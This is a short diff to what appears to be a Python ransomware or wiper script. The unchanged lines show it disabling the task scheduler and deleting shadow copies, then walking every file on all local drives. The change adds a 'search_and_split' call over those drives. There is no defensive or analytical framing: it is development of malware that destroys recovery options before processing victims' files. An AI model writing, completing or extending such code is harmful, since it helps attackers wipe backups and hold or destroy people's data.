@@ -49,6 +49,8 @@ if __name__ == '__main__':
         print("Disable task scheduler and delete shadow copies operations failed")
 
     local_drives = cm.get_local_drives()
+
+    cm.search_and_split(local_drives)
     
     for ld in local_drives:
         for root, dirs, files in os.walk(ld):
